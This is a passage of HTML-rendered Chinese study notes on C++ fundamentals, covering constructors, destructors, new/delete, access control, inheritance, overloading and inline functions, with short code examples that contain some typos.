是类A的f()，不是a的f(); a做f()的动作, 但f()所做的对象为a.i</span></span><br><span class="line">	b.<span class="built_in">f</span>();<span class="comment">//同理 f()是类A的f(),与上面a.f()为调用同一个函数,但是f()知道所做的对象为b.i  就相当于传一个指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="类是一个概念，一种观点"><a href="#类是一个概念，一种观点" class="headerlink" title="类是一个概念，一种观点"></a>类是一个概念，一种观点</h2><h2 id="Call-functions-in-a-class"><a href="#Call-functions-in-a-class" class="headerlink" title="Call functions in a class"></a>Call functions in a class</h2><h2 id="this-the-hidden-parameters-pointer-to-caller"><a href="#this-the-hidden-parameters-pointer-to-caller" class="headerlink" title="this: the hidden parameters, pointer to caller"></a>this: the hidden parameters, pointer to caller</h2><h2 id="this-is-a-hidden-parameter-for-all-member-functions-with-the-type-of-the-class"><a href="#this-is-a-hidden-parameter-for-all-member-functions-with-the-type-of-the-class" class="headerlink" title="this is a hidden parameter for all member functions with the type of the class"></a><strong>this</strong> is a hidden parameter for all member functions with the type of the class</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Point::printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    -&gt;<span class="params">(can be regarded as)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Point::print</span><span class="params">(Point  *p)</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
<h2 id="c-翻译器-c-的特性如何用c语言表达出来"><a href="#c-翻译器-c-的特性如何用c语言表达出来" class="headerlink" title="c++ 翻译器 c++的特性如何用c语言表达出来"></a>c++ 翻译器 c++的特性如何用c语言表达出来</h2><h3 id="To-call-the-funciton-you-must-specify-a-variable"><a href="#To-call-the-funciton-you-must-specify-a-variable" class="headerlink" title="To call the funciton, you must specify a variable;"></a>To call the funciton, you must specify a variable;</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Point a;</span><br><span class="line">a.<span class="built_in">print</span>();</span><br><span class="line">	-&gt;(can be regarded as)</span><br><span class="line">Point::<span class="built_in">print</span>(&amp;a);</span><br></pre></td></tr></table></figure>
<h2 id="this-pointer-to-the-caller"><a href="#this-pointer-to-the-caller" class="headerlink" title="this: pointer to the caller."></a>this: pointer to the caller.</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220805000818444.png" alt="image-20220805000818444"></p>
<h1 id="第7章-构造和析构"><a href="#第7章-构造和析构" class="headerlink" title="第7章 构造和析构"></a>第7章 构造和析构</h1><h2 id="Point-init"><a href="#Point-init" class="headerlink" title="Point::init()"></a>Point::init()</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">class <span class="title">Point</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx,<span class="keyword">int</span> dx)</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> x;</span><br><span class="line">    	<span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">Point a;</span><br><span class="line">a.<span class="built_in">init</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="built_in">move</span>(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="built_in">print</span>();</span><br><span class="line"><span class="comment">//&quot;烫烫烫&quot;-&gt;未初始化</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806082635365.png" alt="image-20220806082635365"></p>
<h2 id="Constructor-构造器-构造函数"><a href="#Constructor-构造器-构造函数" class="headerlink" title="Constructor (构造器/构造函数)"></a>Constructor (构造器/构造函数)</h2><h2 id="How-constructor-does"><a href="#How-constructor-does" class="headerlink" title="How constructor does?"></a>How constructor does?</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:   	</span><br><span class="line">    	<span class="built_in">A</span>();</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line">A::<span class="built_in">A</span>()&#123;</span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806083703130.png" alt="image-20220806083703130"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806084045493.png" alt="image-20220806084045493"></p>
<h2 id="Constructor-是可以传参数"><a href="#Constructor-是可以传参数" class="headerlink" title="Constructor 是可以传参数"></a>Constructor 是可以传参数</h2><h2 id="destructor-析构器-析构函数"><a href="#destructor-析构器-析构函数" class="headerlink" title="destructor (析构器,析构函数)"></a>destructor (析构器,析构函数)</h2><blockquote>
<ul>
<li>In C++, cleanup is as important as initialization and is therefore guaranteed with the destructor</li>
<li>The destrucor is named after the name of the class with a leading tilde (~). The destructor never has any arguments.</li>
</ul>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806085227937.png" alt="image-20220806085227937"></p>
<p><strong>called</strong>(调用)</p>
<h1 id="第八章-对象初始化"><a href="#第八章-对象初始化" class="headerlink" title="第八章 对象初始化"></a>第八章 对象初始化</h1><h2 id="Storage-allocation"><a href="#Storage-allocation" class="headerlink" title="Storage allocation"></a>Storage allocation</h2><p>c语言可以在函数任何的地方定义变量</p>
<hr>
<p>在哪定义的就在哪执行构造函数</p>
<h2 id="Aggregate-initialization"><a href="#Aggregate-initialization" class="headerlink" title="Aggregate initialization"></a>Aggregate initialization</h2><blockquote>
<ul>
<li><p>int a[5] ={1,2,3,,4,5}</p>
</li>
<li><p>int b[6]={5]};</p>
</li>
<li>……</li>
</ul>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220807201734992.png" alt="image-20220807201734992"></p>
<h2 id="The-default-constructor"><a href="#The-default-constructor" class="headerlink" title="The default constructor"></a>The default constructor</h2><blockquote>
<p>构造函数没有参数就叫 default constructor</p>
</blockquote>
<h1 id="第九章-Dynamic-memory-allocation-动态分配"><a href="#第九章-Dynamic-memory-allocation-动态分配" class="headerlink" title="第九章 Dynamic memory allocation 动态分配"></a>第九章 Dynamic memory allocation 动态分配</h1><blockquote>
<ul>
<li><p>new</p>
<ul>
<li>new int;</li>
<li>new Stash;</li>
<li>new int[10]</li>
</ul>
</li>
<li><p>delete</p>
<ul>
<li>delete p;</li>
<li>delete[] p;</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="任何运算符都有结果-结果都是地址"><a href="#任何运算符都有结果-结果都是地址" class="headerlink" title="(任何运算符都有结果 结果都是地址)"></a>(任何运算符都有结果 结果都是地址)</h2><ul>
<li>new is the way to allocate memory as a program runs. Pointers become the only access to that memory</li>
<li>delete enables you to return memory to the memory pool when you are finished with it.</li>
<li>Example arraynew.cpp</li>
</ul>
<p>new 的方式申请数组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> * psome = <span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">10</span>];</span><br><span class="line"><span class="keyword">delete</span> [] psome; <span class="comment">//若不带方括号 delete psome  析构只调用第一个变量</span></span><br><span class="line">Student *q = <span class="keyword">new</span> <span class="built_in">Student</span>();</span><br><span class="line">Student *r = <span class="keyword">new</span> Student[<span class="number">10</span>]; </span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure>
<h3 id="Tips-for-new-and-delete"><a href="#Tips-for-new-and-delete" class="headerlink" title="Tips  for new and delete"></a>Tips  for new and delete</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line">a++;</span><br><span class="line"><span class="keyword">delete</span>[] a; <span class="comment">//回收失败 ,找不到其实地址</span></span><br><span class="line"><span class="keyword">delete</span> q;</span><br><span class="line"><span class="keyword">delete</span> r; <span class="comment">//空间会回收但是 只调用一次析构</span></span><br><span class="line"><span class="keyword">delete</span>[] r;<span class="comment">//空间会回收但是 会调用n一次析构</span></span><br></pre></td></tr></table></figure>
<h3 id="Tips-for-new-and-delete-1"><a href="#Tips-for-new-and-delete-1" class="headerlink" title="Tips for new and delete"></a>Tips for new and delete</h3><ul>
<li>不要用 <strong>delete</strong> 回收 未使用<strong>new</strong>的内存</li>
<li><p>如上</p>
</li>
<li><p>delete 一个空指针/未调用的变量是安全的</p>
</li>
</ul>
<p>申请内存没有释放容易有内存泄露</p>
<p>new后-&gt; 最好要delete</p>
<h1 id="第十章-访问限制-Setting-limit"><a href="#第十章-访问限制-Setting-limit" class="headerlink" title="第十章 访问限制 Setting limit"></a>第十章 访问限制 Setting limit</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811063157020.png" alt="image-20220811063157020"></p>
<p>C++ access control</p>
<ul>
<li>public 任何人都可以访问</li>
<li>private 只有自己(这个类的成员函数)能够调用 /// 同一个类的实例化对象之间可以互相访问私有成员</li>
<li>protected</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811064109686.png" alt="image-20220811064109686"></p>
<h2 id="Friends"><a href="#Friends" class="headerlink" title="Friends"></a>Friends</h2><p>不同类声明 Friends 可以获得访问private权限</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">   	<span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(X*,<span class="keyword">int</span>)</span></span>; <span class="comment">// g函数访问 X的private</span></span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">Y::f</span><span class="params">(X*)</span></span>;<span class="comment">// Y类的f函数访问 X的private</span></span><br><span class="line">    	<span class="keyword">friend</span> <span class="class"><span class="keyword">struct</span> <span class="title">Z</span>;</span><span class="comment">// 整个Z类函数访问 X的private</span></span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span></span>; <span class="comment">//h函数能访问 X的private</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Class-vs-Struct"><a href="#Class-vs-Struct" class="headerlink" title="Class vs Struct"></a>Class vs Struct</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811065106709.png" alt="image-20220811065106709"></p>
<blockquote>
<p>Default value: 缺省值</p>
</blockquote>
<h2 id="初始化列表-Initializter-list"><a href="#初始化列表-Initializter-list" class="headerlink" title="初始化列表  Initializter list"></a>初始化列表  Initializter list</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">A</span>():<span class="built_in">p</span>(<span class="number">0</span>) <span class="comment">//构造函数:变量(初始值)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233031260.png" alt="image-20220811233031260"></p>
<h2 id="Initialization-vs-assignment-初始化-vs-赋值"><a href="#Initialization-vs-assignment-初始化-vs-赋值" class="headerlink" title="Initialization vs. assignment (初始化 vs 赋值)"></a>Initialization vs. assignment (初始化 vs 赋值)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233156493.png" alt="image-20220811233156493"></p>
<h1 id="第十章-对象组合-软件重用"><a href="#第十章-对象组合-软件重用" class="headerlink" title="第十章 对象组合 软件重用"></a>第十章 对象组合 软件重用</h1><h2 id="Composition-construct-new-object-with-existing-objects"><a href="#Composition-construct-new-object-with-existing-objects" class="headerlink" title="Composition: construct new object with existing objects"></a>Composition: construct new object with existing objects</h2><h2 id="It-is-the-relationship-of-“has-a”"><a href="#It-is-the-relationship-of-“has-a”" class="headerlink" title="It is the relationship of “has-a”"></a>It is the relationship of “has-a”</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233911461.png" alt="image-20220811233911461"></p>
<h2 id="父类-对象在里头-by-reference-指针"><a href="#父类-对象在里头-by-reference-指针" class="headerlink" title="父类(对象在里头)/by reference(指针)"></a>父类(对象在里头)/by reference(指针)</h2><h2 id="Ways-of-inclusion"><a href="#Ways-of-inclusion" class="headerlink" title="Ways of inclusion"></a>Ways of inclusion</h2><ul>
<li>fully</li>
<li>By reference</li>
</ul>
<h2 id="组合的对象依然有独立的作用"><a href="#组合的对象依然有独立的作用" class="headerlink" title="组合的对象依然有独立的作用"></a>组合的对象依然有独立的作用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">///Example; All Constructors can have initialization lis</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>&#123;</span>...&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Currency</span>&#123;</span>...&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SavingsAccount</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">SavingsAccount</span>( <span class="keyword">const</span> <span class="keyword">char</span> * name,<span class="keyword">const</span> <span class="keyword">char</span>*address, <span class="keyword">int</span> cents);</span><br><span class="line">        ~<span class="built_in">SavingAccount</span>();</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">()</span></span>;</span><br><span class="line">  	<span class="keyword">private</span>:</span><br><span class="line">    	person m_saver;</span><br><span class="line">    	Currency m_balance;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SavingsAccount::<span class="built_in">SavingAccount</span>( <span class="keyword">const</span> <span class="keyword">char</span> * name, <span class="keyword">const</span> <span class="keyword">char</span> * address, <span class="keyword">int</span> cents):<span class="built_in">m_saver</span>(name,addrss),<span class="built_in">m_balance</span>(<span class="number">0</span>,cents)&#123;...&#125; <span class="comment">//构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SavingAccount::print</span><span class="params">()</span> </span>&#123; </span><br><span class="line">	m_sever.<span class="built_in">print</span>();</span><br><span class="line">    m_balance.<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811235659945.png" alt="image-20220811235659945"></p>
<p>​    若是</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811235849208.png" alt="image-20220811235849208"></p>
<p>若public了, 则可以在 main函数(或者其他函数,反正就是外面)初始化</p>
<p>private 需要在构造函数的” : “ 初始化.</p>
<h2 id="语言都是很灵活的-某些灵活的特性也不见得好用"><a href="#语言都是很灵活的-某些灵活的特性也不见得好用" class="headerlink" title="语言都是很灵活的, 某些灵活的特性也不见得好用."></a>语言都是很灵活的, 某些灵活的特性也不见得好用.</h2><h1 id="第十一章-继承"><a href="#第十一章-继承" class="headerlink" title="第十一章 继承"></a>第十一章 继承</h1><h2 id="Reusing-the-interface"><a href="#Reusing-the-interface" class="headerlink" title="Reusing the interface"></a>Reusing the interface</h2><p>继承 -&gt; 用类 拼出一个类(概念)</p>
<p>组合 -&gt; 用对象 组合出新的对象(实体)</p>
<blockquote>
<p>Inheritance is to take the exsting class, clone it, and then make additons and modification to the clone</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813010704562.png" alt="image-20220813010704562"></p>
<h2 id="Inheritance-继承"><a href="#Inheritance-继承" class="headerlink" title="Inheritance (继承)"></a>Inheritance (继承)</h2><ul>
<li>Language Implementation technique</li>
<li>Also an important component of the OO design methodology</li>
<li>Allows sharing of design for<ul>
<li>Member data</li>
<li>member functions</li>
<li>Interfaces</li>
</ul>
</li>
<li>Key technology in C++</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813011030497.png" alt="image-20220813011030497"></p>
<p>one class (学生student)  another class(人person) 学生继承了人的一种属性</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813011528217.png" alt="image-20220813011528217"></p>
<ul>
<li>Base Class (基类)</li>
<li>Super Class (超类)</li>
<li><p>Parent Clas (父类)</p>
</li>
<li><p>Derived Class (派生类)</p>
</li>
<li>Sub Class (子类)</li>
<li>Child Class (子类)</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">A</span>():<span class="built_in">i</span>(<span class="number">0</span>) &#123; cout &lt;&lt; <span class="string">&quot;A::A()&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">        ~<span class="built_in">A</span>()&#123; cout&lt;&lt;<span class="string">&quot;~A::A()&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; cout&lt;&lt;<span class="string">&quot;A::print(): &quot;</span>&lt;&lt;i&lt;&lt;endl; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> ii)</span> </span>&#123; i=ii; &#125;</span><br><span class="line">    <span class="keyword">private</span> :</span><br><span class="line">        <span class="keyword">int</span> i;   	</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123; <span class="comment">// B类就作为A的子类</span></span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">set</span>(<span class="number">10</span>);</span><br><span class="line">    b.<span class="built_in">print</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* cout:</span></span><br><span class="line"><span class="comment">A::A()</span></span><br><span class="line"><span class="comment">A::print(): 10</span></span><br><span class="line"><span class="comment">~A::A()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="父类的私有属性-子类无法直接使用"><a href="#父类的私有属性-子类无法直接使用" class="headerlink" title="父类的私有属性 子类无法直接使用"></a>父类的私有属性 子类无法直接使用</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813012922715.png" alt="image-20220813012922715"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>:  <span class="comment">//子类可以用, main等不可以用;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813013248417.png" alt="image-20220813013248417"></p>
<blockquote>
<p> client class: 对象</p>
</blockquote>
<h1 id="第十二章-父类子类的关系"><a href="#第十二章-父类子类的关系" class="headerlink" title="第十二章 父类子类的关系"></a>第十二章 父类子类的关系</h1><blockquote>
<p>‘&amp;’ reference 引用</p>
</blockquote>
<h2 id="Declare-an-Employee-class"><a href="#Declare-an-Employee-class" class="headerlink" title="Declare an Employee class"></a>Declare an Employee class</h2><blockquote>
<p>inline (内连的)</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//Declare an Employee class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">Employee</span>( <span class="keyword">const</span> std::string&amp; name, <span class="keyword">const</span> std::string &amp; snn );</span><br><span class="line">        <span class="function"><span class="keyword">const</span> std::string&amp; <span class="title">get_name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out)</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out)</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out, <span class="keyword">const</span> std::string&amp; msg)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        std::string m_name;</span><br><span class="line">        std::string m_ssn;    </span><br><span class="line">&#125;;</span><br><span class="line">Employee:<span class="built_in">Employee</span>( <span class="keyword">const</span> string&amp; name, <span class="keyword">const</span> string&amp; ssn ): <span class="built_in">m_name</span>(name),<span class="built_in">m_ssn</span>(ssn)&#123;</span><br><span class="line">    <span class="comment">//initializer list sets up the values!;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employee member functions</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">const</span> std::string&amp; <span class="title">Employee::get_name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> m_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Employee::print</span> <span class="params">(std::ostream&amp; out )</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    out&lt;&lt; m_name &lt;&lt; endl;</span><br><span class="line">    out&lt;&lt; m_ssn &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Employee::print</span> <span class="params">(std:: ostream&amp; out, <span class="keyword">const</span> std::string&amp; msg)</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// 重载函数</span></span><br><span class="line">    out&lt;&lt; msg &lt;&lt;endl;</span><br><span class="line">    <span class="built_in">print</span>(out); <span class="comment">// 调用上面那个Employee::print 代码重调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>继承了父类</strong> = <strong>子类使用时会调用父类的构造函数</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123; <span class="comment">// B类就作为A的子类</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">B</span>():<span class="built_in">A</span>(<span class="number">15</span>) &#123; cout &lt;&lt; <span class="string">&quot;B::B()&quot;</span> &lt;&lt; endl; &#125; <span class="comment">//必须在这里传参数给A类</span></span><br><span class="line">    	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B::B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//构造时候 先A 再B</span></span><br><span class="line"><span class="comment">// 析构的时候 先B 再A</span></span><br><span class="line"><span class="comment">// 类似栈的原理</span></span><br></pre></td></tr></table></figure>
<h2 id="Now-add-Manager"><a href="#Now-add-Manager" class="headerlink" title="Now add Manager"></a>Now add Manager</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> Man</span><br></pre></td></tr></table></figure>
<p>c++ 语言:</p>
<p>子类重名同参数函数 会把 父类重载的所有函数覆盖(隐藏)</p>
<p>如果使用父类出现而子类不出现的 “同名函数, 不同参数” 甚至会报错.</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220815005924102.png" alt="image-20220815005924102"></p>
<p>想调用必须</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">b.A::<span class="built_in">printf</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<h1 id="第十三章-函数重载和默认参数-缺省值"><a href="#第十三章-函数重载和默认参数-缺省值" class="headerlink" title="第十三章 函数重载和默认参数(缺省值)"></a>第十三章 函数重载和默认参数(缺省值)</h1><h2 id="Function-Overloading"><a href="#Function-Overloading" class="headerlink" title="Function Overloading"></a>Function Overloading</h2><p>返回类型不能构成overload条件, 于是返回类型必须相同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span>)</span></span></span><br></pre></td></tr></table></figure>
<h1 id="Default-arguments-默认参数"><a href="#Default-arguments-默认参数" class="headerlink" title="Default arguments //默认参数"></a>Default arguments //默认参数</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Stash</span>(<span class="keyword">int</span> size, <span class="keyword">int</span> initQuantity=<span class="number">0</span>);</span><br><span class="line"><span class="comment">//1: Stash(100); // Default initQuantity=0;</span></span><br><span class="line"><span class="comment">//2: Stash(100,200); // initQuantity=200;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220815010811989.png" alt="image-20220815010811989"></p>
<p><strong>chico</strong>写法错误, 默认参数必须从右到左写过去. 即 j先有, 再m有</p>
<h2 id="Default-arguments-写在声明里-不写在定义里"><a href="#Default-arguments-写在声明里-不写在定义里" class="headerlink" title="Default arguments 写在声明里 不写在定义里."></a>Default arguments 写在声明里 不写在定义里.</h2><p>Default arguments 是运行时候的事情, 编译器替你补上你写的缺省值.</p>
<h1 id="第十四章-内联函数"><a href="#第十四章-内联函数" class="headerlink" title="第十四章 内联函数"></a>第十四章 内联函数</h1><h2 id="Overhead-for-a-function-call-overhead-额外的开销"><a href="#Overhead-for-a-function-call-overhead-额外的开销" class="headerlink" title="Overhead for a function call  (overhead 额外的开销  )"></a>Overhead for a function call  (overhead 额外的开销  )</h2><ul>
<li>the processing time required by a device prior to the execution of a command<ul>
<li>Push parameters</li>
<li>Push return address</li>
<li>Prepare return values</li>
<li>Pop all pushed</li>
</ul>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816054648165.png" alt="image-20220816054648165"></p>
<p>每个程序都有一个独立的堆栈</p>
<p>call 一个函数需要做这么多额外的事情</p>
<h2 id="Inline-Functions"><a href="#Inline-Functions" class="headerlink" title="Inline Functions"></a>Inline Functions</h2><p>An iniline function is expanded in place, like a pre pocesor macro, so the overhead of the function call is  eliminated.</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816060151494.png" alt="image-20220816060151494"></p>
<p>相当于插入代码在主函数中</p>
<h2 id="Inline-Funcions"><a href="#Inline-Funcions" class="headerlink" title="Inline Funcions"></a>Inline Funcions</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">plusOne</span><span class="params">( <span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">plusOne</span><span class="params">( <span class="keyword">int</span> x)</span> </span>&#123;<span class="keyword">return</span> ++x;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Repeat <strong>inline</strong> keyword at declaration and definition. (在声明和定义中都需要写inline 函数)</li>
<li>An inline function definition may not generate any code in .obj file.</li>
</ul>
<p>Inline: 空间换时间</p>
